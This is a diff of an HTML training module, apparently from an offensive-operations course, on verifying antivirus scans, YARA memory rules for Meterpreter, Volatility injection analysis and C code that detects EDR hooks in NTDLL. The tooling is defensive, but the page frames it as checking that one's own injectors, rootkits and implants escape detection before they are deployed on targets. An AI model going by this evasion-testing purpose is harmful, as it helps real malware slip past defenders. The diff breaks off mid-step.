@@ -12,6 +12,9 @@
             --accent2: #00ff88;
             --dim: #666;
             --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -32,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -101,6 +119,7 @@
             color: #aaaaff;
             margin: 0.5rem 0;
             cursor: pointer;
+            position: relative;
         }
         .copy-paste:hover { background: #1a1a30; }
         .why-box {
@@ -118,6 +137,30 @@
             margin: 1rem 0;
         }
         .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .injection-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .inj-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .inj-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
         button {
             background: var(--accent);
             color: var(--bg);
@@ -128,6 +171,146 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .checklist {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            margin: 1rem 0;
+        }
+        .checklist li {
+            margin: 0.5rem 0;
+            list-style: none;
+        }
+        .checklist li::before {
+            content: "☐ ";
+            color: var(--accent2);
+            font-weight: bold;
+        }
+        .checklist li.checked::before {
+            content: "☑ ";
+            color: var(--accent2);
+        }
+        .tag {
+            display: inline-block;
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-right: 0.3rem;
+            font-weight: bold;
+        }
+        .tag-red { background: #3a0a0a; color: var(--accent); border: 1px solid var(--accent); }
+        .tag-green { background: #0a3a0a; color: var(--accent2); border: 1px solid var(--accent2); }
+        .tag-amber { background: #3a3a0a; color: var(--amber); border: 1px solid var(--amber); }
+        .tag-neon { background: #0a2a2a; color: var(--neon); border: 1px solid var(--neon); }
     </style>
 </head>
 <body>
@@ -145,299 +328,1441 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>A scan result is just text until you prove it means something. "0 detections" could mean clean, or it could mean the scanner never ran, or the file was excluded, or the definitions were stale. Verification is the discipline of proving your tools work before you bet your operation on them.</p>
+            <p>A scan result is just text until you prove it means something. <span class="neon-highlight">"0 detections"</span> could mean clean, or it could mean the scanner never ran, or the file was excluded, or the definitions were stale. Verification is the discipline of proving your tools work before you bet your operation on them.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Every offensive tool you build — injectors, rootkits, C2 implants — must be verified against real defensive controls. If you don't verify, you're guessing. And guessing gets you caught.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>You wouldn't field a rifle without test-firing it. Same for malware. Before you deploy a tool on a target, you scan it. But how do you know the scan was real? This module teaches you to read scan results like a forensic analyst — not just the headline, but the metadata that proves the scan actually happened.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">More than that: you learn to verify memory, detect API hooks, analyze parent-child relationships, and test EDR/AMSI/ETW — so you know what the defender sees when you run your tools.</p>
         </div>
 
-        <h2>The Method: How to Verify a Scan</h2>
-
-        <div class="step-box">
-            <h4>Step 1: Open Your Terminal</h4>
-            <p>You need a command prompt. Not PowerShell. Not Developer Command Prompt. The standard Windows Command Prompt.</p>
-            
-            <div class="copy-paste">
-                Press Win + R, type "cmd", press Enter
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>How injectors work — OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. You must understand injection to verify it was detected.</p>
             </div>
-
-            <div class="why-box">
-                <h5>Why cmd and not PowerShell?</h5>
-                <p>Kaspersky's command-line scanner (avp.exe) is designed for cmd.exe. PowerShell adds extra parsing that can break arguments. When you're verifying, you want the simplest path — no variables, no pipelines, no surprises.</p>
+            <div class="method-card">
+                <h4><a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a></h4>
+                <p>Kernel-level hiding, DKOM, SSDT hooks. You must understand rootkit techniques to verify defensive sensors catch them.</p>
             </div>
-        </div>
-
-        <div class="step-box">
-            <h4>Step 2: Check the File Exists</h4>
-            <p>Before scanning, confirm the file is where you think it is.</p>
-
-            <div class="copy-paste">
-dir C:\Users\gwu07\phantom_rpc.exe
+            <div class="method-card">
+                <h4><a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a></h4>
+                <p>Unhooking, syscalls, direct invocation. You must understand evasion to build verification tests that defeat it.</p>
             </div>
-
-            <div class="code-block">
-Volume in drive C is Windows
-Volume Serial Number is XXXX-XXXX
-
-Directory of C:\Users\gwu07
-
-06/29/2026  12:16 AM           153,600 phantom_rpc.exe
-               1 File(s)        153,600 bytes
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>Virtual memory layout, page protections, VAD trees. Required for memory scanning verification.</p>
             </div>
-
-            <div class="why-box">
-                <h5>What am I looking for?</h5>
-                <p><strong>Size:</strong> 153,600 bytes. If this is 0 bytes, the file is empty. If it's missing, wrong path. <strong>Date:</strong> Should match when you compiled it. If the date is old and you just built it, you're looking at the wrong file.</p>
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>SeDebugPrivilege, tokens, integrity levels. Required for accessing other processes' memory during verification.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>AMSI bypass techniques, script block logging. Required for AMSI/ETW verification testing.</p>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 3: Run the Kaspersky Scan</h4>
-            <p>Now scan the file. This is the exact command with every flag explained.</p>
+        <h2>🔬 The Defensive Verification Kill Chain</h2>
+        <p>Every defensive verification follows the same pattern. Master this pattern and you can validate any security control:</p>
 
-            <div class="copy-paste">
-"C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.exe" SCAN C:\Users\gwu07\phantom_rpc.exe /i0
+        <div class="injection-flow">
+            <div class="inj-step">
+                <h5>1. BASELINE</h5>
+                <p><span class="neon-highlight">Establish Normal</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Document what "clean" looks like</p>
             </div>
-
-            <div class="why-box">
-                <h5>What does each part mean?</h5>
-                <ul style="margin-left: 1.5rem; line-height: 2;">
-                    <li><strong>"C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.exe"</strong> — The scanner executable. Quotes needed because of spaces in path.</li>
-                    <li><strong>SCAN</strong> — The command. Tells avp.exe to scan, not update or report.</li>
-                    <li><strong>C:\Users\gwu07\phantom_rpc.exe</strong> — The target file. Full path, no quotes needed (no spaces).</li>
-                    <li><strong>/i0</strong> — Action on detect: 0 = "Ask after scan". Doesn't delete or quarantine. Lets you see the result.</li>
-                </ul>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>2. INJECT</h5>
+                <p><span class="neon-highlight">Deploy Test Payload</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Run known-bad technique</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>3. OBSERVE</h5>
+                <p><span class="neon-highlight">Capture Telemetry</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Collect logs, memory, network</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>4. VERIFY</h5>
+                <p><span class="neon-highlight">Prove Detection</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Did the control actually fire?</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>5. DOCUMENT</h5>
+                <p><span class="neon-highlight">Record Evidence</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Reproducible proof of result</p>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 4: Read the Output Like a Forensic Analyst</h4>
-            <p>This is the real scan output from .92 on 2026-06-29. Every line matters.</p>
+        <div class="why-box">
+            <h5>Why this pattern is universal</h5>
+            <p>Every security control — AV, EDR, firewall, DLP — can be verified with the same five steps. The payload changes (malware, injection, data exfiltration), but the verification methodology never does. <span class="neon-amber">This is the scientific method applied to offensive security.</span></p>
+        </div>
 
-            <div class="code-block">
-AV bases release date: 2026-06-28 18:11:00 (full)
-; --- Settings ---
-; Action on detect:	Ask after scan
-; Scan objects:	All objects
-; Use iChecker:	Yes
-; Use iSwift:	Yes
-; Try disinfect:	Yes
-; Try delete:	Yes
-; Try delete container:	No
-; Scan archives:	No
-; Exclude by mask:	No
-; Include by mask:	No
-; Objects to scan:
-; 	"C:\Users\gwu07\phantom_rpc.exe"	Enable = Yes	Recursive = No
-; ------------------
-2026-06-29 07:44:54	Scan_Objects$2997		starting	1
-2026-06-29 07:44:54	C:\Users\gwu07\phantom_rpc.exe//#	ok
-Progress 1%...
-2026-06-29 07:44:54	C:\Users\gwu07\phantom_rpc.exe	ok
-Progress 1%...
-2026-06-29 07:44:56	Scan_Objects$2997		completed
-Info: task 'ods' finished, last error code 0
-;  --- Statistics ---
-; Time Start:	2026-06-29 07:44:54
-; Time Finish:	2026-06-29 07:44:56
-; Processed objects:	2
-; Total OK:	2
-; Total detected:	0
-; Suspicions:	0
-; Total skipped:	0
-; Password protected:	0
-; Corrupted:	0
-; Errors:	0
-;  ------------------
-            </div>
+        <h2>🎯 Section 1: Memory Scanning Verification</h2>
+        <p>AV scans files on disk. EDR scans memory. A file can be "clean" on disk but malicious in memory. Memory scanning verification proves your defensive tools see what actually executes.</p>
+
+        <div class="method-card" id="memory-scanning">
+            <h4>Technique 1: YARA Memory Scanning <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>YARA rules match patterns in memory. EDRs use YARA-like engines to detect shellcode, injected DLLs, and unpacked payloads. You verify by injecting known-bad shellcode and checking if YARA catches it.</p>
 
             <div class="why-box">
-                <h5>How do I know this scan was REAL?</h5>
-                <p>Check these 6 verification points:</p>
-                <ol style="margin-left: 1.5rem; line-height: 2;">
-                    <li><strong>AV bases date:</strong> "2026-06-28 18:11:00" — Current definitions, not stale. If this says 2025 or "unknown", the scan is worthless.</li>
-                    <li><strong>iChecker + iSwift:</strong> "Yes" — Both enabled. This means KAV used its full scanning engine, not a cached shortcut. If either says "No", the scan might have skipped parts.</li>
-                    <li><strong>Processed objects:</strong> "2" — The file was actually read and analyzed. If this is 0, the scanner never touched it.</li>
-                    <li><strong>Task completed:</strong> "task 'ods' finished, last error code 0" — No crash, no abort. Clean completion.</li>
-                    <li><strong>Time taken:</strong> 2 seconds for 153KB — Reasonable. If it's 0.1 seconds, suspicious (maybe cached). If it's 60 seconds, maybe hung.</li>
-                    <li><strong>Total detected: 0, Suspicions: 0:</strong> The headline. But only valid if the above 5 checks pass.</li>
-                </ol>
+                <h5>Why this works</h5>
+                <p>Malware often unpacks or injects itself into memory. The disk image is benign (encrypted, packed, or legitimate). The memory image contains the real payload. <span class="neon-highlight">YARA scans memory</span> to find the unpacked truth.</p>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 1: Create a Test YARA Rule</h4>
+                <p>This rule detects a common Meterpreter reverse shell signature in memory.</p>
+
+                <div class="code-block">
+rule meterpreter_mem_check
+{
+    meta:
+        description = "Detects Meterpreter reverse_tcp payload in memory"
+        author = "22nd Survey Division"
+        date = "2026-06-29"
+    strings:
+        $a = { 48 31 c9 48 81 e9 c0 ff ff ff 48 8d 05 }  // x64 decoder stub
+        $b = "metsrv.x64.dll" wide ascii
+        $c = { 4d 45 54 45 52 50 52 45 54 45 52 }           // "METERPRETER"
+    condition:
+        any of them
+}
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>What am I looking at?</h5>
+                    <p><strong>$a</strong> — Hex bytes of a common x64 decoder stub. Meterpreter uses this to unpack itself. <strong>$b</strong> — The string "metsrv.x64.dll", Meterpreter's core DLL name. <strong>$c</strong> — The ASCII bytes for "METERPRETER". If ANY of these match in a process's memory, the rule fires.</p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Run YARA Against a Suspicious Process</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+yara64.exe -p 8 meterpreter_mem_check.yar &lt;PID&gt;
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+# Example: Scan notepad.exe PID 1234
+yara64.exe -p 8 meterpreter_mem_check.yar 1234
+
+# Output if POSITIVE (detection):
+meterpreter_mem_check 1234
+
+# Output if NEGATIVE (no detection):
+# (no output — YARA is silent on no match)
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>What does -p 8 mean?</h5>
+                    <p>8 threads for scanning. Memory scanning is I/O bound — more threads speed it up. Don't use more threads than CPU cores.</p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 3: Verify the Scan Actually Happened</h4>
+                <p>YARA has no "verbose" mode by default. Use <span class="neon-highlight">-s</span> to show matching strings, proving the scan touched memory:</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+yara64.exe -p 8 -s meterpreter_mem_check.yar 1234
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+meterpreter_mem_check 1234
+0x7ff812345678:$a: 48 31 c9 48 81 e9 c0 ff ff ff 48 8d 05
+0x7ff812345690:$b: 6d 65 74 73 72 76 2e 78 36 34 2e 64 6c 6c
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>How do I know this scan was REAL?</h5>
+                    <p><strong>Virtual addresses present:</strong> 0x7ff812345678 — This is a real memory address in the target process. Fake scans don't show addresses. <strong>Matching bytes:</strong> 48 31 c9... matches our rule exactly. <strong>Multiple strings:</strong> Both $a and $b matched — increases confidence.</p>
+                </div>
             </div>
 
             <div class="warning-box">
-                <h5>⚠️ What would a FAKE or BROKEN scan look like?</h5>
+                <h5>⚠️ What would a FAKE or BROKEN YARA scan look like?</h5>
                 <ul style="margin-left: 1.5rem; line-height: 2;">
-                    <li><strong>"Total skipped: 1"</strong> — File was excluded or unreadable. Scan didn't happen.</li>
-                    <li><strong>"Errors: 1"</strong> — Scanner crashed or file was locked. Result invalid.</li>
-                    <li><strong>"AV bases: unknown"</strong> — Definitions not loaded. Blind scan.</li>
-                    <li><strong>"Total OK: 0"</strong> — File wasn't processed. Maybe wrong path.</li>
-                    <li><strong>No output at all</strong> — avp.exe not found, wrong path, or no permission.</li>
+                    <li><strong>No output on a known-infected process</strong> — Rule is wrong, or process isn't actually infected, or YARA can't read the memory (access denied).</li>
+                    <li><strong>"error: can't open file"</strong> — Wrong PID, process exited, or insufficient privileges.</li>
+                    <li><strong>Matches on EVERY process</strong> — Rule is too broad (false positive storm). Tighten strings.</li>
+                    <li><strong>Addresses in kernel space on a user-mode process</strong> — Impossible. Indicates corrupted output or wrong PID.</li>
                 </ul>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 5: Verify the File State After Scan</h4>
-            <p>A real scan with "0 detections" should leave the file untouched. If the file is gone, the scan lied or the AV auto-deleted.</p>
+        <div class="method-card" id="memory-dump-verify">
+            <h4>Technique 2: Memory Dump Verification with Volatility <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Volatility analyzes RAM dumps offline. You verify by dumping a process's memory, then using Volatility plugins to detect injection, hollowed processes, and hidden DLLs.</p>
 
-            <div class="copy-paste">
-dir C:\Users\gwu07\phantom_rpc.exe
+            <div class="step-box">
+                <h4>Step 1: Dump Process Memory</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+procdump.exe -accepteula -ma &lt;PID&gt; suspicious.dmp
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+# Dump notepad.exe (PID 1234) with all memory (including private pages)
+procdump.exe -accepteula -ma 1234 notepad_suspicious.dmp
+
+[12:34:56] Dump 1 initiated: notepad_suspicious.dmp
+[12:34:57] Dump 1 complete: 847 MB written in 2.1 seconds
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
             </div>
 
-            <div class="code-block">
-06/29/2026  12:16 AM           153,600 phantom_rpc.exe
+            <div class="step-box">
+                <h4>Step 2: Analyze with Volatility malfind</h4>
+                <p><span class="neon-highlight">malfind</span> finds injected code — memory regions that are executable but not backed by a file on disk.</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+volatility3 -f notepad_suspicious.dmp windows.malfind.Malfind
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+PID     Process         Start             End               Protection
+------  --------------  ----------------  ----------------  ----------
+1234    notepad.exe     0x1a40000         0x1a41fff         PAGE_EXECUTE_READWRITE
+
+# Disassembly of first bytes at 0x1a40000:
+0x1a40000: fc                 cld
+0x1a40001: 48 83 e4 f0        and rsp, 0xfffffffffffffff0
+0x1a40005: e8 c0 00 00 00     call 0x1a400d0
+
+# VAD tags: VadS (Private memory, no file backing)
+# Protection: PAGE_EXECUTE_READWRITE (RWE) — highly suspicious
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>How do I know this is injected code?</h5>
+                    <p><strong>VadS tag:</strong> "S" = Short VAD = private allocated memory. No file backs it. <strong>PAGE_EXECUTE_READWRITE:</strong> RWE is rare for legitimate code. Legitimate DLLs use PAGE_EXECUTE_READ. RWE suggests dynamically allocated shellcode. <strong>Call instruction:</strong> 0xe8 is a relative call — common in position-independent shellcode. <strong>No mapped file:</strong> If malfind shows a region with no file path, it's either heap, stack, or injected.</p>
+                </div>
             </div>
+
+            <div class="step-box">
+                <h4>Step 3: Verify with ldrmodules</h4>
+                <p><span class="neon-highlight">ldrmodules</span> compares three lists of loaded DLLs: PEB (what the process thinks it has), VAD (what memory says), and kernel modules. Mismatches = hidden/unlinked DLLs (rootkit technique from Module 11).</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+volatility3 -f notepad_suspicious.dmp windows.ldrmodules.LdrModules
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+PID     Process          Base              InLoad  InInit  InMem   MappedPath
+------  ---------------  ----------------  ------  ------  ------  ------------------------
+1234    notepad.exe      0x7ff600000000    True    True    True    C:\Windows\notepad.exe
+1234    notepad.exe      0x7ff812340000    True    True    True    C:\Windows\System32\ntdll.dll
+1234    notepad.exe      0x7ff812350000    True    False   False   UNKNOWN
+
+# The third entry: InLoad=True, InInit=False, InMem=False
+# The DLL is in the PEB load list but NOT in initialization order or memory lists
+# This is a classic unlinked DLL — rootkit hiding technique
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="warning-box">
+                    <h5>⚠️ Cross-link to Module 11: Rootkits</h5>
+                    <p>This exact technique — unlinking a DLL from InInit and InMem lists — is covered in <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a>. If you see this pattern, the process is rootkitted. The defensive verification proves the rootkit failed to hide completely.</p>
+                </div>
+            </div>
+        </div>
+
+        <h2>🎯 Section 2: API Hooking Detection</h2>
+        <p>EDR products hook critical Windows APIs (NtCreateThreadEx, NtAllocateVirtualMemory) to monitor behavior. Attackers unhook them (Module 13). Defenders verify hooks are present and functional. You must verify both sides: that hooks exist, and that unhooking defeats them.</p>
+
+        <div class="method-card" id="api-hook-detect">
+            <h4>Technique 1: Detect User-Mode API Hooks <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>EDR hooks typically overwrite the first 5-20 bytes of NTDLL functions with a JMP to the EDR's monitoring DLL. You detect this by comparing the in-memory bytes of NTDLL against the on-disk NTDLL.dll.</p>
 
             <div class="why-box">
-                <h5>What am I checking?</h5>
-                <p><strong>File still exists:</strong> If KAV detected something, it might quarantine or delete. File present = no action taken. <strong>Size unchanged:</strong> 153,600 bytes. If size changed, KAV modified it. <strong>Date unchanged:</strong> Still 12:16 AM. If date changed, KAV touched it.</p>
+                <h5>Why this works</h5>
+                <p>NTDLL.dll on disk is the "gold standard." When Windows loads it into a process, EDR may patch it. If the in-memory version differs from the disk version at function entry points, <span class="neon-highlight">someone patched it</span> — either EDR (legitimate hook) or malware (unhooking attempt).</p>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 1: Read NTDLL from Disk vs Memory</h4>
+
+                <div class="code-block">
+// hook_detect.c — Detect API hooks by comparing NTDLL on disk vs in memory
+// Compile: cl.exe hook_detect.c /Fe:hook_detect.exe
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;psapi.h&gt;
+
+#pragma comment(lib, "psapi.lib")
+
+// Read NTDLL from disk (the "clean" reference)
+BOOL ReadNtdllFromDisk(LPBYTE* buffer, DWORD* size) {
+    HANDLE hFile = CreateFileA(
+        "C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    
+    *size = GetFileSize(hFile, NULL);
+    *buffer = (LPBYTE)malloc(*size);
+    DWORD read;
+    ReadFile(hFile, *buffer, *size, &read, NULL);
+    CloseHandle(hFile);
+    return TRUE;
+}
+
+// Get function RVA from export table
+DWORD GetExportRVA(LPBYTE base, const char* funcName) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
+        base + nt->OptionalHeader.DataDirectory[0].VirtualAddress
+    );
+    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
+    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
+    
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        char* name = (char*)(base + names[i]);
+        if (strcmp(name, funcName) == 0) {
+            return funcs[ordinals[i]];
+        }
+    }
+    return 0;
+}
+
+int main() {
+    LPBYTE diskNtdll;
+    DWORD diskSize;
+    if (!ReadNtdllFromDisk(&diskNtdll, &diskSize)) {
+        printf("[-] Failed to read NTDLL from disk\n");
+        return 1;
+    }
+    
+    // Get NTDLL base in current process memory
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    LPBYTE memNtdll = (LPBYTE)hNtdll;
+    
+    // Check NtCreateThreadEx — commonly hooked by EDR
+    const char* targetFunc = "NtCreateThreadEx";
+    DWORD rva = GetExportRVA(diskNtdll, targetFunc);
+    if (!rva) {
+        printf("[-] Could not find %s in export table\n", targetFunc);
+        return 1;
+    }
+    
+    printf("[+] %s RVA: 0x%08X\n", targetFunc, rva);
+    
+    // Compare first 32 bytes
+    printf("[+] Comparing first 32 bytes (disk vs memory):\n");
+    for (int i = 0; i < 32; i++) {
+        BYTE diskByte = diskNtdll[rva + i];
+        BYTE memByte = memNtdll[rva + i];
+        
+        if (diskByte != memByte) {
+            printf("    MISMATCH at offset +%02d: disk=0x%02X, mem=0x%02X  &lt;--- HOOK DETECTED\n", 
+                   i, diskByte, memByte);
+        } else {
+            printf("    Match at offset +%02d: 0x%02X\n", i, memByte);
+        }
+    }
+    
+    free(diskNtdll);
+    return 0;
+}
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>What am I looking for?</h5>
+                    <p><strong>MISMATCH lines:</strong> If you see "MISMATCH at offset +0" with disk=0x4C and mem=0xE9, that's a JMP (0xE9) replacing the real instruction. <span class="neon-amber">EDR hook confirmed.</span> If ALL bytes match, either no EDR is present, or the EDR uses a different hooking technique (e.g., hardware breakpoints, kernel callbacks).</p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Interpret Results</h4>
+
+                <div class="code-block">
+=== HOOKED PROCESS (with EDR) ===
+[+] NtCreateThreadEx RVA: 0x000C2110
+[+] Comparing first 32 bytes (disk vs memory):
+    MISMATCH at offset +0: disk=0x4C, mem=0xE9  &lt;--- HOOK DETECTED
+    MISMATCH at offset +1: disk=0x8B, mem=0x1D
+    MISMATCH at offset +2: disk=0xD1, mem=0x00
+    ... (JMP rel32 to EDR monitoring DLL)
+
+=== CLEAN PROCESS (no EDR / unhooked) ===
+[+] NtCreateThreadEx RVA: 0x000C2110
+[+] Comparing first 32 bytes (disk vs memory):
+    Match at offset +0: 0x4C
+    Match at offset +1: 0x8B
+    Match at offset +2: 0xD1
+    ... (all match — no hook present)
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="warning-box">
+                    <h5>⚠️ Cross-link to Module 13: EDR Evasion</h5>
+                    <p>The "clean" output above is exactly what an attacker achieves after <a href="MODULE_13_EDR_EVASION.html" class="cross-link">unhooking</a> (Module 13). They read NTDLL from disk and overwrite the hooked bytes in memory. Your verification must detect BOTH: hooks present (EDR working) and hooks absent (EDR evaded or no EDR).</p>
+                </div>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 6: Cross-Machine Verification</strong></h4>
-            <p>One scan on one machine proves nothing. The same file scanned on a different machine with the same AV — that's verification.</p>
-
-            <div class="copy-paste">
